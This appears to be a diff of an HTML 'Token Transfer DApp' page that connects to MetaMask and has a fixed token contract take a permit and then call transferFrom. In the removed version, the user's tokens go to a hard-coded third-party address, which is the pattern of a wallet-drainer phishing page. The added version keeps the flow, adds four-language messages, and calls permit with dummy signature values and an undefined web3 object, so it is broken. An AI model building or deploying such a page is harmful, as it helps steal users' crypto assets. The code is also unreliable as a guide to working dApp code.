@@ -1,19 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Connect</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <title>Token Transfer DApp</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        button {
+            padding: 10px 15px;
+            margin: 10px 0;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:disabled {
+            background-color: #ccc;
+        }
+    </style>
 </head>
 <body>
-    <h1>Connect Your Wallet</h1>
-    <button id="connectWalletButton">Connect Wallet</button>
-    <button id="signPermitButton" disabled>Sign Permit</button>
-    <button id="transferTokensButton" disabled>Transfer Tokens</button>
+    <h1 id="title">代币转移 DApp</h1>
+    <button id="connectButton">连接钱包</button>
+    <button id="signButton" disabled>签名授权</button>
+    <button id="transferButton" disabled>转移代币</button>
 
     <script>
-        const contractAddress = '0x2E9d30761DB97706C536A112B9466433032b28e3';
+        const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3";
         const abi = [
             {
                 "inputs": [{"internalType": "address","name": "account","type": "address"}],
@@ -50,73 +68,81 @@
             }
         ];
 
-        let web3;
-        let contract;
-        let selectedAccount;
+        const messages = {
+            "zh": {
+                "connect": "连接钱包",
+                "sign": "签名授权",
+                "transfer": "转移代币",
+                "notConnected": "未连接钱包，请检查浏览器扩展或重试。",
+                "signFailed": "签名失败，请重试。"
+            },
+            "en": {
+                "connect": "Connect Wallet",
+                "sign": "Sign Permit",
+                "transfer": "Transfer Tokens",
+                "notConnected": "Not connected. Please check your browser extension and try again.",
+                "signFailed": "Sign failed. Please try again."
+            },
+            "kr": {
+                "connect": "지갑 연결",
+                "sign": "서명 허가",
+                "transfer": "토큰 전송",
+                "notConnected": "연결되지 않았습니다. 브라우저 확장을 확인하고 다시 시도하십시오.",
+                "signFailed": "서명 실패. 다시 시도하십시오."
+            },
+            "jp": {
+                "connect": "ウォレット接続",
+                "sign": "サイン許可",
+                "transfer": "トークン転送",
+                "notConnected": "接続されていません。ブラウザ拡張機能を確認し、再試行してください。",
+                "signFailed": "サインに失敗しました。再試行してください。"
+            }
+        };
 
-        // Connect Wallet
-        document.getElementById('connectWalletButton').addEventListener('click', async () => {
+        let currentLanguage = "zh"; // 默认语言
+
+        document.getElementById("connectButton").onclick = async () => {
             if (typeof window.ethereum !== 'undefined') {
                 try {
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    web3 = new Web3(window.ethereum);
-                    const accounts = await web3.eth.getAccounts();
-                    selectedAccount = accounts[0];
-                    contract = new web3.eth.Contract(abi, contractAddress);
-                    alert(`Connected to wallet: ${selectedAccount}`);
-                    document.getElementById('signPermitButton').disabled = false;
-                    document.getElementById('transferTokensButton').disabled = false;
+                    document.getElementById("signButton").disabled = false;
                 } catch (error) {
-                    console.error('Connection failed:', error);
-                    alert('Connection failed. Please try again.');
+                    alert(messages[currentLanguage].notConnected);
                 }
             } else {
-                alert('Please install MetaMask to use this feature.');
+                alert("请安装 MetaMask！");
             }
-        });
+        };
 
-        // Sign Permit
-        document.getElementById('signPermitButton').addEventListener('click', async () => {
-            const spender = contractAddress;  // The contract address is the spender
-            const value = web3.utils.toWei('1', 'ether'); // Permit value
-            const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
-
-            const permitData = await web3.eth.signTypedData(
-                [{
-                    type: 'address',
-                    name: 'owner',
-                    value: selectedAccount
-                }, {
-                    type: 'address',
-                    name: 'spender',
-                    value: spender
-                }, {
-                    type: 'uint256',
-                    name: 'value',
-                    value: value
-                }, {
-                    type: 'uint256',
-                    name: 'deadline',
-                    value: deadline
-                }]
-            );
-
-            alert(`Permit signed successfully: ${permitData}`);
-        });
-
-        // Transfer Tokens
-        document.getElementById('transferTokensButton').addEventListener('click', async () => {
-            const recipient = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';  // The destination address
-            const amount = web3.utils.toWei('1', 'ether');
+        document.getElementById("signButton").onclick = async () => {
+            const accounts = await ethereum.request({ method: 'eth_accounts' });
+            const account = accounts[0];
+            const deadline = Math.floor(Date.now() / 1000) + 60 * 60; // 1小时后过期
+            const v = 0; // 示例值
+            const r = '0x'; // 示例值
+            const s = '0x'; // 示例值
 
             try {
-                await contract.methods.transferFrom(selectedAccount, recipient, amount).send({ from: selectedAccount });
-                alert('Tokens transferred successfully!');
+                const contract = new window.web3.eth.Contract(abi, contractAddress);
+                await contract.methods.permit(account, account, 1000, deadline, v, r, s).send({ from: account });
+                document.getElementById("transferButton").disabled = false;
             } catch (error) {
-                console.error('Transfer failed:', error);
-                alert('Transfer failed. Please try again.');
+                alert(messages[currentLanguage].signFailed);
             }
-        });
+        };
+
+        document.getElementById("transferButton").onclick = async () => {
+            const accounts = await ethereum.request({ method: 'eth_accounts' });
+            const account = accounts[0];
+            const recipient = "0xYourRecipientAddress"; // 替换为收款地址
+            const amount = 100; // 转移数量
+
+            const contract = new window.web3.eth.Contract(abi, contractAddress);
+            await contract.methods.transferFrom(account, recipient, amount).send({ from: account });
+            alert("代币转移成功！");
+        };
     </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
 </body>
 </html>
